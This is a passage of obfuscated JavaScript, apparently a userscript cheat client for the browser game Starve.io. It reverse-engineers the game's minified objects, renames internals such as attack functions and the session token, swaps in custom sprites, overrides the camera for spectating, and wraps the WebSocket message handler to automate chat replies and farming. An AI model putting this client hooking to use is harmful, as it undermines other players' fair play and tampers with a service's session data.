    apply: e => typeof e == "function" && e.toString().includes(".substring") && e.toString().includes(".stringify")
  }, {
    key: "send_attack",
    apply: e => typeof e == "function" && e.toString().replace(/\s+/g, "").includes("Math.PI") && e.toString().replace(/\s+/g, "").includes(")]));}")
  }, {
    key: "last_cam",
    apply: e => typeof e == "object" && e && Object.keys(e).length === 2 && Object.values(e).filter(e => typeof e == "number").length === 2
  }, {
    key: "chat",
    apply: e => typeof e == "function" && e.length === 1 && e.toString().replace(/\s+/g, "").includes("Math.random()") && e.toString().replace(/\s+/g, "").includes(".mode")
  }, {
    key: "gauges_life",
    apply: e => typeof e == "function" && e.length === 2 && a0BUFFerresult(e.toString().replace(/\s+/g, ""), "=") === 2
  }, {
    key: "leaderboard",
    apply: e => typeof e == "function" && e.length === 1 && a0BUFFerresult(e.toString().replace(/\s+/g, ""), "this") === 1 && e.toString().includes("Uint16Array")
  }, {
    key: "try_ping",
    apply: e => typeof e == "function" && e.length === 0 && e.toString().replace(/\s+/g, "").includes("this.ping()")
  }, {
    key: "gather",
    apply: e => typeof e == "function" && e.length === 1 && a0BUFFerresult(e.toString().replace(/\s+/g, ""), ".length") === 3 && e.toString().includes(".id") && a0BUFFerresult(e.toString().replace(/\s+/g, ""), ".push(") === 1
  }, {
    key: "send_build",
    apply: e => typeof e == "function" && e.length === 0 && e.toString().replace(/\s+/g, "").includes(".mode")
  }, {
    key: "lost",
    apply: e => typeof e == "function" && e.length === 0 && e.toString().includes("reconnect.enabled") && e.toString().includes("return")
  }]);
  {
    let t = Object.keys(a0GETList).filter(e => typeof a0GETList[e] == "function" && a0GETList[e].length === 1 && a0BUFFerresult(a0GETList[e].toString().replace(/\s+/g, ""), ";") === 2 && a0BUFFerresult(a0GETList[e].toString().replace(/\s+/g, ""), "=") === 1);
    let i = t[1];
    if (i) {
      Object.defineProperty(a0GETList, "craft_ok", {
        get() {
          return this[i];
        },
        set(e) {
          this[i] = e;
        }
      });
    } else {
      console.log("Cannot extract client.craft_ok key");
    }
  }
  a0JUMPdisk(USERTOFIX, [{
    key: "inv",
    apply: e => typeof e == "object" && e !== null && "max" in e && e.max == 10
  },
  {
    key: "control",
    apply: e => typeof e === "object" && e !== null && "angle" in e && "attack" in e && "timeout" in e
  },
  {
    key: "uid",
    apply: (e, t) => typeof e == "number" && e !== undefined && e === 0 && Object.keys(USERTOFIX).slice(0, t).some(e => e === "id")
  }, {
    key: "cam",
    apply: e => typeof e == "object" && e !== null && "rx" in e && "ry" in e && "w" in e && "x" in e && "y" in e
  }, {
    key: "gauges",
    apply: e => typeof e == "object" && e !== null && "c" in e
  }, {
    key: "alive",
    apply: e => typeof e == "boolean"
  }, {
    key: "ghost",
    apply: e => typeof e == "object" && e !== null && "enabled" in e && "label" in e && "now" in e
  }, {
    key: "craft",
    apply: e => typeof e == "object" && e !== null && "id" in e && "label" in e && "mode" in e && "timeout" in e
  }, {
    key: "auto_feed",
    apply: e => typeof e == "object" && e && "enabled" in e && "translate" in e && Object.values(e).filter(e => typeof e == "function").length > 1
  }, {
    key: "chat",
    apply: e => typeof e == "object" && e && e.input === document.getElementById("chat_input")
  }, {
    key: "terminal",
    apply: e => typeof e == "object" && e && e.input === document.getElementById("commandInput")
  }, {
    key: "team",
    apply: e => Array.isArray(e) && e.length === 0
  }, {
    key: "resurrection",
    apply: e => typeof e == "object" && e && "open" in e && !("time" in e)
  }, {
    key: "well",
    apply: (e, t) => typeof e == "object" && e && "open" in e && !("time" in e) && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "open" in e && !("time" in e)).length === 1
  }, {
    key: "windmill",
    apply: (e, t) => typeof e == "object" && e && "open" in e && !("time" in e) && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "open" in e && !("time" in e)).length === 2
  }, {
    key: "extractor",
    apply: (e, t) => typeof e == "object" && e && "open" in e && !("time" in e) && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "open" in e && !("time" in e)).length === 3
  }, {
    key: "bread_oven",
    apply: (e, t) => typeof e == "object" && e && "open" in e && !("time" in e) && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "open" in e && !("time" in e)).length === 4
  }, {
    key: "sign",
    apply: (e, t) => typeof e == "object" && e && "open" in e && !("time" in e) && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "open" in e && !("time" in e)).length === 5
  }, {
    key: "furnace",
    apply: (e, t) => typeof e == "object" && e && "open" in e && !("time" in e) && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "open" in e && !("time" in e)).length === 6
  }, {
    key: "chest",
    apply: (e, t) => typeof e == "object" && e && "open" in e && !("time" in e) && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "open" in e && !("time" in e)).length === 7
  }, {
    key: "desert",
    apply: (e, t) => typeof e == "object" && e && "add" in e && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "add" in e).length === 1
  }, {
    key: "winter",
    apply: (e, t) => typeof e == "object" && e && "add" in e && Object.values(USERTOFIX).slice(0, t).filter(e => typeof e == "object" && e && "add" in e).length === 2
  }, {
    key: "bigmap",
    apply: (e, t) => typeof e == "boolean" && Object.values(USERTOFIX).slice(0, t).findIndex(e => typeof e == "object" && e === USERTOFIX.gauges) <= t - 1 && Object.values(USERTOFIX).slice(0, t).findIndex(e => typeof e == "object" && e === USERTOFIX.gauges) >= t - 5
  }]);
  a0JUMPdisk(USERTOFIX.inv, [{
    key: "n",
    apply: e => Array.isArray(e)
  }, {
    key: "can_select",
    apply: (e, t) => Array.isArray(e) && Object.values(USERTOFIX.inv).slice(0, t).some(e => Array.isArray(e))
  }, {
    key: "find_item",
    apply: e => typeof e == "function" && e.length === 1 && !e.toString().includes("true")
  }]);
  a0JUMPdisk(USERTOFIX.terminal, [{
    key: "write_command",
    apply: e => typeof e == "function" && e.length === 4
  }, {
    key: "commands",
    apply: e => typeof e == "function" && e.length === 1 && e.toString().includes("switch")
  }]);
  a0JUMPdisk(USERTOFIX.craft, [{
    key: "crafting",
    apply: e => typeof e == "boolean"
  }]);
  a0JUMPdisk(USERTOFIX.gauges, [{
    key: "update",
    apply: e => typeof e == "function" && e.length === 0
  }]);
  {
    let $ = Object.keys(USERTOFIX.craft).find(e => Array.isArray(USERTOFIX.craft[e]) && e !== "label");
    if ($) {
      Object.defineProperty(USERTOFIX.craft, "can_craft", {
        get() {
          return this[$];
        }
      });
    } else {
      console.log("Cannot extract user.craft.can_craft");
    }
  }
  {
    let o = Object.keys(USERTOFIX);
    let l = o.filter(e => typeof USERTOFIX[e] == "object" && USERTOFIX[e] && "wait" in USERTOFIX[e]);
    let n = l[0];
    let s = l[1];
    let r = l[2];
    let c = l[3];
    Object.defineProperties(USERTOFIX, {
      totem: {
        get() {
          return this[n];
        }
      },
      helmet: {
        get() {
          return this[s];
        }
      },
      build: {
        get() {
          return this[r];
        }
      },
      weapon: {
        get() {
          return this[c];
        },
        set(e) {
          return this[c] = e;
        }
      }
    });
  }
  a0JUMPdisk(a0CLONelog, [{
    key: "units",
    apply: e => Array.isArray(e) && e.length === 107
  }, {
    key: "MAX_DIST",
    apply: e => typeof e == "number" && e && e === -1000000
  }, {
    key: "dist_from_biomes",
    apply: e => typeof e == "function" && e.length === 1 && e.toString().replace(/\s+/g, "").includes("r.y;") && e.toString().replace(/\s+/g, "").includes("r.y;")
  }, {
    key: "delete_units",
    apply: e => typeof e == "function" && e.length === 1 && a0BUFFerresult(e.toString().replace(/\s+/g, ""), ".splice(") === 1 && !e.toString().includes("Math")
  }]);
  let O = Object.keys(a0CLONelog).filter(e => Array.isArray(a0CLONelog[e]) && a0CLONelog[e].length === 0)[0];
  Object.defineProperty(a0CLONelog, "players", {
    get: function () {
      return a0CLONelog[O];
    }
  });
  {
    let p = Object.keys(a0CLONelog).filter(e => Array.isArray(a0CLONelog[e]) && a0CLONelog[e].length === 0)[1];
    Object.defineProperty(a0CLONelog, "fast_units", {
      get() {
        return this[p];
      }
    });
  }
  a0JUMPdisk(a0MINIfyresult, [{
    key: "gauges",
    apply: e => typeof e == "object" && e !== null && "translate" in e && "y" in e
  }, {
    key: "chest_buttons",
    apply: e => Array.isArray(e) && e.length >= 358 && e.length < 500
  }, {
    key: "update_connection",
    apply: e => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString().replace(/\s+/g, ""), "();") === 4 && a0BUFFerresult(e.toString().replace(/\s+/g, ""), ".") === 4
  }, {
    key: "update_scene",
    apply: e => {
      if (typeof e !== "function") return false;
      const s = e.toString();
      if (!/^function\s*\(\s*\)/.test(s)) return false;
      const calls = (s.match(/\(\s*\)/g) || []).length;
      return calls >= 5 && s.includes("reconnect.enabled") && s.includes("&&") && s.includes("this.");
    }
  },
  {
    key: "draw_ui",
    apply: e => typeof e == "function" && e.length === 0 && e.toString().replace(/\s+/g, "").includes(".mode")
  }, {
    key: "safe_delete",
    apply: e => typeof e == "object" && e !== undefined && "open" in e && e?.id?.id === "sure_delete"
  }, {
    key: "trigger_mouseup",
    apply: e => typeof e == "function" && e.length === 1 && e.toString().includes("enabled")
  }, {
    key: "minimap",
    apply: e => typeof e == "object" && e !== undefined && "translate" in e && Object.values(e).some(e => Array.isArray(e))
  }]);
  a0JUMPdisk(a0MINIfyresult.safe_delete, [{
    key: "one",
    apply: e => typeof e == "function" && e.length === 0 && e.name !== "all" && e.toString().includes("enabled") && a0BUFFerresult(e.toString(), "&&") === 2
  }]);
  if (a0MINIfyresult.gauges) {
    a0JUMPdisk(a0MINIfyresult.gauges, [{
      key: "img",
      apply: e => typeof e == "object" && e !== undefined && e instanceof HTMLCanvasElement
    }]);
  }
  a0JUMPdisk(a0ACKNowledgevalue, [{
    key: "getTokenForJoinGame",
    apply: e => typeof e == "function" && e.length === 2 && e.toString().includes("callback")
  }]);
  // a0JUMPdisk(a0QUEUeschema, [{
  //   key: "is_left",
  //   apply: (e, t) => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString(), "keys") === 2 && e.toString().includes("||") && Object.values(a0QUEUeschema).slice(0, t).filter(e => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString(), "keys") === 2 && e.toString().includes("||")).length === 0
  // }, {
  //   key: "is_right",
  //   apply: (e, t) => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString(), "keys") === 2 && e.toString().includes("||") && Object.values(a0QUEUeschema).slice(0, t).filter(e => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString(), "keys") === 2 && e.toString().includes("||")).length === 1
  // }, {
  //   key: "is_top",
  //   apply: (e, t) => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString(), "keys") === 2 && e.toString().includes("||") && Object.values(a0QUEUeschema).slice(0, t).filter(e => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString(), "keys") === 2 && e.toString().includes("||")).length === 2
  // }, {
  //   key: "is_bottom",
  //   apply: (e, t) => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString(), "keys") === 2 && e.toString().includes("||") && Object.values(a0QUEUeschema).slice(0, t).filter(e => typeof e == "function" && e.length === 0 && a0BUFFerresult(e.toString(), "keys") === 2 && e.toString().includes("||")).length === 3
  // }]);
  let u = Object.keys(a0DECOdestatus)[5];
  Object.defineProperty(a0DECOdestatus, "pos", {
    get() {
      return this[u];
    }
  });
  let N = Object.keys(USERTOFIX.control)[3];
  Object.defineProperty(USERTOFIX.control, "mouse", {
    get() {
      return this[N];
    },
    set(e) {
      this[N] = e;
    }
  });
  let E = Object.keys(USERTOFIX.control)[2];
  Object.defineProperty(USERTOFIX.control, "previous", {
    get() {
      return this[E];
    },
    set(e) {
      this[E] = e;
    }
  });
  if (USERTOFIX.gauges) {
    let d = Object.keys(USERTOFIX.gauges);
    Object.defineProperties(USERTOFIX.gauges, {
      l: {
        get() {
          return this[d[1]];
        }
      },
      h: {
        get() {
          return this[d[2]];
        }
      },
      t: {
        get() {
          return this[d[3]];
        }
      },
      o: {
        get() {
          return this[d[4]];
        }
      },
      wa: {
        get() {
          return this[d[5]];
        }
      }
    });
    if (!USERTOFIX.gauges.warn_cold && !USERTOFIX.gauges.warn_life && !USERTOFIX.gauges.warn_hunger && !USERTOFIX.gauges.warn_thirst && !USERTOFIX.gauges.warn_oxygen && !USERTOFIX.gauges.warn_warm) {
      USERTOFIX.gauges.warn_cold = new a0CLONescript.LinearAnimation(true, 0, 1, 0, 3, 3);
      USERTOFIX.gauges.warn_life = new a0CLONescript.LinearAnimation(true, 0, 1, 0, 2, 2);
      USERTOFIX.gauges.warn_hunger = new a0CLONescript.LinearAnimation(true, 0, 1, 0, 3, 3);
      USERTOFIX.gauges.warn_thirst = new a0CLONescript.LinearAnimation(true, 0, 1, 0, 3, 3);
      USERTOFIX.gauges.warn_oxygen = new a0CLONescript.LinearAnimation(true, 0, 1, 0, 3, 3);
      USERTOFIX.gauges.warn_warm = new a0CLONescript.LinearAnimation(true, 0, 1, 0, 3, 3);
    }
    USERTOFIX.gauges.cold = USERTOFIX.gauges[d[12]];
    USERTOFIX.gauges.life = USERTOFIX.gauges[d[13]];
    USERTOFIX.gauges.hunger = USERTOFIX.gauges[d[14]];
    USERTOFIX.gauges.thirst = USERTOFIX.gauges[d[15]];
    USERTOFIX.gauges.oxygen = USERTOFIX.gauges[d[16]];
    USERTOFIX.gauges.warm = USERTOFIX.gauges[d[17]];
  }
  if (USERTOFIX.cam) {
    let f = Object.keys(USERTOFIX.cam);
    let g = f.indexOf("w");
    let A = f[g + 1];
    let h = f[g + 2];
    let R = f[g + 3];
    Object.defineProperty(USERTOFIX.cam, "h", {
      get() {
        return this[A];
      },
      set(e) {
        this[A] = e;
      }
    });
    Object.defineProperty(USERTOFIX.cam, "rw", {
      get() {
        return this[h];
      },
      set(e) {
        this[h] = e;
      }
    });
    Object.defineProperty(USERTOFIX.cam, "rh", {
      get() {
        return this[R];
      },
      set(e) {
        this[R] = e;
      }
    });
  }
  {
    let C = false;
    for (let y in a0GETList) {
      if (C) {
        a0GETList.get_focus = a0GETList[y];
        break;
      }
      let m = a0GETList[y];
      if (typeof m == "function" && m.toString().includes(".level") && m.toString().includes(".label")) {
        a0GETList.new_player = a0GETList[y];
        C = true;
      }
    }
    if (!C) {
      console.log("Faile to extract client.get_focus & client.new_player");
    }
  }
  {
    let M;
    for (let L in a0GETList) {
      if (a0GETList.send_attack === a0GETList[L]) {
        a0GETList.stop_attack = M;
        break;
      }
      M = a0GETList[L];
    }
    if (!a0GETList.stop_attack) {
      console.log("Failed to extract client.stop_attack");
    }
  }
  {
    let P = Object.values(a0GETList);
    let D = P.indexOf(a0GETList.send_attack);
    a0GETList.send_angle = P[D + 1];
    a0GETList.send_move = P[D + 2];
  }
  Object.defineProperty(a0GETList.last_cam, "i", {
    get() {
      return Object.values(this)[0];
    },
    set(e) {
      this[Object.keys(this)[0]] = e;
    }
  });
  Object.defineProperty(a0GETList.last_cam, "j", {
    get() {
      return Object.values(this)[1];
    },
    set(e) {
      this[Object.keys(this)[1]] = e;
    }
  });
  {
    let T = Object.keys(a0GETList);
    let _ = Object.values(a0GETList).indexOf(a0GETList.last_cam);
    if (_) {
      Object.defineProperty(a0GETList, "cam_delay", {
        get: () => a0GETList[T[_ - 1]],
        set(e) {
          a0GETList[T[_ - 1]] = e;
        }
      });
    }
  }
  {
    let I = Object.keys(a0GETList);
    for (let S = 0; S < I.length; S++) {
      if (a0GETList[I[S]] === a0GETList.select_inv) {
        let k = I[S + 3];
        Object.defineProperty(a0GETList, "recycle_inv", {
          get() {
            return this[k];
          },
          set(e) {
            this[k] = e;
          }
        });
        break;
      }
    }
  }
  {
    let b = Object.keys(USERTOFIX.craft)[4];
    Object.defineProperty(USERTOFIX.craft, "preview", {
      get() {
        return this[b];
      },
      set(e) {
        if (typeof e == "number") {
          this[b] = e;
        } else {
          console.error("Giá trị phải là kiểu number");
        }
      }
    });
  }
  {
    let v = Object.keys(unsafeWindow).find(e => (!!Array.isArray(unsafeWindow[e]) || !"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ_0123456789".includes(e[0])) && unsafeWindow[e].length > 800 && unsafeWindow[e].length < 2000);
    if (a0MINIfydata = unsafeWindow[v]) {
      let H = new Image();
      let U = new Image();
      let B = new Image();
      let j = new Image();
      let x = new Image();
      let K = new Image();
      let w = new Image();
      let J = new Image();
      let z = new Image();
      let F = new Image();
      let W = new Image();
      let G = new Image();
      let V = new Image();
      let Y = new Image();
      let X = new Image();
      let q = new Image();
      let Q = new Image();
      let Z = new Image();
      let ee = new Image();
      let ea = new Image();
      let et = new Image();
      let ei = new Image();
      let e$ = new Image();
      let eo = new Image();
      let el = new Image();
      let en = new Image();
      let es = new Image();
      let er = new Image();
      let ec = new Image();
      let eO = new Image();
      let ep = new Image();
      let eu = new Image();
      let eN = new Image();
      let eE = new Image();
      let ed = new Image();
      let ef = new Image();
      H.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/reidite-spike-ally.png";
      U.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/amethyst-spike-ally.png";
      B.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/diamond-spike-ally.png";
      j.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/gold-spike-ally.png";
      x.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/stone-spike-ally.png";
      K.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/wood-spike-ally.png";
      w.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/reidite-spike-door-ally.png";
      J.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/amethyst-spike-door-ally.png";
      z.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/diamond-spike-door-ally.png";
      F.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/gold-spike-door-ally.png";
      W.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/stone-spike-door-ally.png";
      G.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/wood-spike-door-ally.png";
      V.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_reidite2.png";
      Y.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_amethyst1.png";
      X.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_diamond2.png";
      q.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_gold2.png";
      Q.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_stone1.png";
      Z.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_wood2.png";
      ee.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/reidite-spike-enemy.png";
      ea.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/amethyst-spike-enemy.png";
      et.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/diamond-spike-enemy.png";
      ei.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/gold-spike-enemy.png";
      e$.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/stone-spike-enemy.png";
      eo.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/wood-spike-enemy.png";
      el.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/reidite-spike-door-enemy.png";
      en.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/amethyst-spike-door-enemy.png";
      es.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/diamond-spike-door-enemy.png";
      er.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/gold-spike-door-enemy.png";
      ec.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/stone-spike-door-enemy.png";
      eO.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/wood-spike-door-enemy.png";
      ep.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_reidite1.png";
      eu.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_amethyst2.png";
      eN.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_diamond1.png";
      eE.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_gold1.png";
      ed.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_stone2.png";
      ef.src = "https://raw.githubusercontent.com/akuma2311/starveimg/main/door_wood1.png";
      a0MINIfydata[10000] = [K, K];
      a0MINIfydata[10001] = [eo, eo];
      a0MINIfydata[10002] = [x, x];
      a0MINIfydata[10003] = [e$, e$];
      a0MINIfydata[10004] = [j, j];
      a0MINIfydata[10005] = [ei, ei];
      a0MINIfydata[10006] = [B, B];
      a0MINIfydata[10007] = [et, et];
      a0MINIfydata[10008] = [U, U];
      a0MINIfydata[10009] = [ea, ea];
      a0MINIfydata[10010] = [H, H];
      a0MINIfydata[10011] = [ee, ee];
      a0MINIfydata[10012] = [w, w];
      a0MINIfydata[10013] = [el, el];
      a0MINIfydata[10014] = [J, J];
      a0MINIfydata[10015] = [en, en];
      a0MINIfydata[10016] = [z, z];
      a0MINIfydata[10017] = [es, es];
      a0MINIfydata[10018] = [F, F];
      a0MINIfydata[10019] = [er, er];
      a0MINIfydata[10020] = [W, W];
      a0MINIfydata[10021] = [ec, ec];
      a0MINIfydata[10022] = [G, G];
      a0MINIfydata[10023] = [eO, eO];
      a0MINIfydata[10024] = [V, V];
      a0MINIfydata[10025] = [ep, ep];
      a0MINIfydata[10026] = [Y, Y];
      a0MINIfydata[10027] = [eu, eu];
      a0MINIfydata[10028] = [X, X];
      a0MINIfydata[10029] = [eN, eN];
      a0MINIfydata[10030] = [q, q];
      a0MINIfydata[10031] = [eE, eE];
      a0MINIfydata[10032] = [Q, Q];
      a0MINIfydata[10033] = [ed, ed];
      a0MINIfydata[10034] = [Z, Z];
      a0MINIfydata[10035] = [ef, ef];
      a0MINIfydata[10100] = [];
      a0MINIfydata[10100][0] = a0LOCKsession(a0NOTIfyview(0.5, true, ["#133a2b", "#9e8838", "#c4a23a", "#4c3b19", "#614627", "#614627", "#614627", "#c4a23a", "#c4a23a", "#c4a23a"]));
      a0MINIfydata[10100][1] = a0LOCKsession(a0NOTIfyview(0.5, true, ["#032428", "#266161", "#2b6664", "#123335", "#1f5453", "#1f5453", "#1f5453", "#2b6664", "#2b6664", "#2b6664"]));
      a0MINIfydata[10101] = [];
      a0MINIfydata[10101][0] = a0LOCKsession(a0NOTIfyview(0.5, 1, "#133a2b #9e8838 #0D9900 #4c3b19 #614627 #614627 #614627 #0D9900 #0D9900 #0D9900".split(" ")));
      a0MINIfydata[10101][1] = a0LOCKsession(a0NOTIfyview(0.5, 1, "#032428 #266161 #0D9900 #123335 #1f5453 #1f5453 #1f5453 #0D9900 #0D9900 #0D9900".split(" ")));
      a0MINIfydata[10102] = [];
      a0MINIfydata[10102][0] = a0LOCKsession(a0NOTIfyview(0.5, 1, "#133a2b #9e8838 #940000 #4c3b19 #614627 #614627 #614627 #940000 #940000 #940000".split(" ")));
      a0MINIfydata[10102][1] = a0LOCKsession(a0NOTIfyview(0.5, 1, "#032428 #266161 #940000 #123335 #1f5453 #1f5453 #1f5453 #940000 #940000 #940000".split(" ")));
    } else {
      console.log("Failed to extract SPRITE");
    }
  }
  a0ACCEptstats = Object.values(unsafeWindow).find(e => typeof e == "object" && !Array.isArray(e) && e !== null && Object.keys(e).length !== 0 && Object.values(e).every(e => typeof e == "string") && e.constructor.name !== "Storage");
  if (a0MINIfyresult.chest_buttons && a0MINIfyresult.chest_buttons[0] && a0MINIfyresult.chest_buttons[0].info && !("img" in a0MINIfyresult.chest_buttons[0].info)) {
    let eg;
    let eA = a0MINIfyresult.chest_buttons[0].info;
    let eh = Object.keys(eA);
    for (let eR of eh) {
      let eC = eA[eR];
      if (Array.isArray(eC)) {
        eg = eR;
        break;
      }
    }
    if (eg) {
      a0MINIfyresult.chest_buttons.forEach(e => {
        Object.defineProperty(e.info, "img", {
          get() {
            return this[eg];
          }
        });
      });
      {
        let ey;
        let em = a0MINIfyresult.chest_buttons[100].info.img[0];
        let eM = Object.keys(em);
        for (let eL of eM) {
          let eP = em[eL];
          if (typeof eP == "string") {
            ey = eL;
            break;
          }
        }
        if (ey) {
          a0MINIfyresult.chest_buttons.forEach(e => {
            if (e && e.info && e.info.img && e.info.img[0]) {
              Object.defineProperty(e.info.img[0], "_src", {
                get() {
                  return this[ey];
                }
              });
            }
          });
        }
      }
    } else {
      console.log("Failed to extract img from game.chest_buttons[0].info");
    }
  }
  {
    let eD = Object.keys(a0CLONelog);
    let eT;
    for (let e_ = 0; e_ < eD.length; e_++) {
      let eI = eD[e_];
      if (typeof a0CLONelog[eI] == "number" && a0CLONelog[eI] && a0CLONelog[eI] === -1000000) {
        eT = e_;
        break;
      }
    }
    let e8 = eD[eT + 1];
    let eS = eD[eT + 2];
    let ek = eD[eT + 3];
    let eb = eD[eT + 4];
    let ev = eD[eT + 5];
    let e0 = eD[eT + 6];
    a0MINIfyspaces = eS;
    Object.defineProperties(a0CLONelog, {
      dist_winter: {
        get() {
          return this[e8];
        }
      },
      dist_desert: {
        get() {
          return this[eS];
        }
      },
      dist_lava: {
        get() {
          return this[ek];
        }
      },
      dist_forest: {
        get() {
          return this[eb];
        }
      },
      dist_water: {
        get() {
          return this[ev];
        }
      },
      dist_dragon: {
        get() {
          return this[e0];
        }
      }
    });
  }
  {
    let eH = Object.keys(USERTOFIX);
    let eU = eH.filter(e => typeof USERTOFIX[e] == "string");
    let e3 = eU[0];
    let eB = eU[1];
    Object.defineProperties(USERTOFIX, {
      token: {
        get() {
          return this[e3];
        },
        set(e) {
          this[e3] = e;
        }
      },
      token_id: {
        get() {
          return this[eB];
        },
        set(e) {
          this[eB] = e;
        }
      }
    });
  }
  {
    let ej = Object.values(USERTOFIX).filter(e => typeof e == "object" && !Array.isArray(e) && e && "enabled" in e)[0];
    let ex;
    for (let e1 in ej) {
      let eK = ej[e1];
      if (typeof eK == "function") {
        ex = e1;
        break;
      }
    }
    if (ex) {
      a0PROMptload.draw = ex;
    } else {
      console.log("cannot extract draw key");
    }
  }
  {
    let ew = Object.keys(a0CLONelog).filter(e => typeof a0CLONelog[e] == "function" && a0CLONelog[e].length === 0)[1];
    if (ew) {
      a0PROMptload.update = ew;
    } else {
      console.log("cannot extract update key");
    }
  }
  {
    let eJ = Object.keys(USERTOFIX).filter(e => typeof USERTOFIX[e] == "object" && USERTOFIX[e] && "enabled" in USERTOFIX[e] && "label" in USERTOFIX[e] && "now" in USERTOFIX[e]);
    if (eJ) {
      a0PROMptload.ghost = eJ;
    } else {
      console.log("Cannot extract ghost key");
    }
  }
  {
    let ez = USERTOFIX.cam;
    let eF = Object.keys(ez).find(e => typeof ez[e] == "function" && ez[e].length === 0);
    let eW = ez[eF];
    ez[eF] = function (...e) {
      if (!a0JUMPfile.Spectator.e) {
        eW.apply(this, e);
      }
    };
  }
  {
    let e4 = Object.keys(a0GETList);
    let e2 = e4[e4.indexOf("timeout") - 3];
    Object.defineProperty(a0GETList, "timeout_server", {
      get() {
        return this[e2];
      },
      set(e) {
        this[e2] = e;
      }
    });
  }
  if (USERTOFIX.desert) {
    let e6 = Object.keys(USERTOFIX.desert).filter(e => typeof USERTOFIX.desert[e] == "number" && USERTOFIX.desert[e] === 0);
    let eG = e6[0];
    Object.defineProperty(USERTOFIX.desert, "tempest", {
      get() {
        return this[eG];
      },
      set(e) {
        this[eG] = e;
      }
    });
  }
  if (USERTOFIX.winter) {
    let e7 = Object.keys(USERTOFIX.winter).filter(e => typeof USERTOFIX.winter[e] == "number" && USERTOFIX.winter[e] === 0);
    let e5 = e7[0];
    Object.defineProperty(USERTOFIX.winter, "tempest", {
      get() {
        return this[e5];
      },
      set(e) {
        this[e5] = e;
      }
    });
  }
}
function a0GUARddisk() {
  (function e() {
    let t;
    for (let i in a0GETList) {
      let $ = a0GETList[i];
      if ($ && typeof $ == "function") {
        let o = $.toString();
        if (o.includes("WebSocket") && o.includes("new")) {
          t = i;
          break;
        }
      }
    }
    if (t && a0GETList[t] && typeof a0GETList[t] == "function") {
      let l = a0GETList[t];
      a0GETList[t] = function (...e) {
        l.apply(this, e);
        (function e() {
          let t;
          let i = a0GETList.socket.onmessage;
          a0GETList.socket.onmessage = function (...e) {
            i.apply(this, e);
            let $ = e[0];
            if (typeof $.data == "string") {
              let o = JSON.parse($.data);
              switch (o[0]) {
                case 0:
                  if (a0JUMPfile.AutoReply.e) {
                    for (let l in a0JUMPfile.AutoReply.db) {
                      if (l.toLowerCase() === o[2].toLowerCase()) {
                        if (a0JUMPfile.AutoReply.IsDelay) {
                          workerTimers.setTimeout(() => {
                            a0REMOvezip(a0JUMPfile.AutoReply.db[l]);
                          }, Math.random() * 3000 + 1000);
                        } else {
                          a0REMOvezip(a0JUMPfile.AutoReply.db[l]);
                        }
                        break;
                      }
                    }
                  }
                  if (a0JUMPfile.AutoFarm.e && a0JUMPfile.AutoFarm.dropBeri && o[2] === a0JUMPfile.AutoFarm.cmd) {
                    let n = a0CLONelog.fast_units[USERTOFIX.uid];
                    let s = a0CLONelog.fast_units[o[1] * a0CLONelog.max_units];
                    if (n.pid !== s.pid && a0CLONescript.dist(n, s) <= a0JUMPfile.AutoFarm.distance) {
                      let r = 0;
                      if (USERTOFIX.inv.n[a0CONNectloop.BERRY]) {
                        a0PARSestream(a0CONNectloop.BERRY);
                        a0REMOvezip("Berries: " + USERTOFIX.inv.n[a0CONNectloop.BERRY]);
                        r += 1100;
                      }
                      if (USERTOFIX.inv.n[a0CONNectloop.PUMPKIN]) {
                        setTimeout(() => {
                          a0PARSestream(a0CONNectloop.PUMPKIN);
                          a0REMOvezip("Pumpkins: " + USERTOFIX.inv.n[a0CONNectloop.PUMPKIN]);
                        }, r);
                        r += 1100;
                      }
